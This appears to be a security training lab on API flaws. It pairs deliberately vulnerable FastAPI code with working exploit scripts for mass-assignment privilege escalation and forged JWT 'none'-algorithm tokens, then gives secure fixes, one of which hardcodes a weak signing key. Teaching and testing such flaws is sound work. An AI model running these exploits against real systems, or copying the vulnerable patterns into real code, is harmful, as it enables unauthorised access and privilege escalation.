# API Vulnerabilities Lab

## 1. Broken Object Level Authorization (BOLA)
*Also known as IDOR, highly prevalent in APIs.*
(Covered similarly in the Web Lab, ensure authorization checks validate object ownership against the current user context.)

## 2. Mass Assignment
### Vulnerable Code
```python
from pydantic import BaseModel

class UserUpdate(BaseModel):
    # VULNERABLE: Allowing modification of sensitive fields like 'is_admin'
    email: str
    is_admin: bool = False

@app.put("/users/{user_id}")
def update_user(user_id: int, user_data: UserUpdate):
    user = db.query(User).filter(User.id == user_id).first()
    # Blindly updating all fields from the input request
    for key, value in user_data.dict().items():
        setattr(user, key, value)
    db.commit()
    return user
```

### Exploit Script
```python
import requests

url = "http://localhost:8000/users/5"
# Payload injecting the 'is_admin' field to escalate privileges
payload = {"email": "attacker@example.com", "is_admin": True}
headers = {"Authorization": "Bearer <user_token>"}
response = requests.put(url, json=payload, headers=headers)
print(response.json())
```

### Secure Fix
```python
class SafeUserUpdate(BaseModel):
    # SECURE: Explicitly define only allowed fields
    email: str

@app.put("/users/{user_id}")
def update_user(user_id: int, user_data: SafeUserUpdate):
    user = db.query(User).filter(User.id == user_id).first()
    user.email = user_data.email
    db.commit()
    return user
```

## 3. Token Manipulation (JWT Null Signature)
### Vulnerable Code
```python
import jwt

@app.get("/secure-data")
def get_secure_data(token: str):
    # VULNERABLE: Not verifying the signature or accepting 'none' algorithm
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        return {"data": "Secret API data"}
    except Exception:
        return {"error": "Invalid token"}
```

### Exploit Script
```python
import jwt
import requests

# Creating a forged token with 'none' algorithm
forged_token = jwt.encode({"user": "admin"}, key="", algorithm="none")

url = f"http://localhost:8000/secure-data?token={forged_token}"
response = requests.get(url)
print(response.json())
```

### Secure Fix
```python
@app.get("/secure-data")
def get_secure_data(token: str):
    # SECURE: Enforce strong algorithm and verify signature
    try:
        decoded = jwt.decode(token, key="supersecretkey", algorithms=["HS256"])
        return {"data": "Secret API data"}
    except jwt.PyJWTError:
        return {"error": "Invalid token"}
```
